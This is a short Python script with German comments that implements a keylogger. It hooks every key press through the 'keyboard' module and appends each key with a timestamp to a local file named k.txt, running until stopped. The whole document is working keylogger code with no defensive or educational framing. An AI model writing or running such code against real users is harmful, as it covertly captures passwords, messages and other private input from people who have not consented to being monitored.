import keyboard  # Installieren Sie zuerst das `keyboard`-Modul mit `pip install keyboard`
from datetime import datetime

log_file = "k.txt"  # Dateiname für den Log

def key_press(event):
    key = event.name
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as file:
        file.write(f"{time}: {key}\n")

keyboard.on_press(key_press)  # Ruft die Funktion `key_press` bei jedem Tastendruck auf

keyboard.wait()  # Hält den Keylogger am Laufen
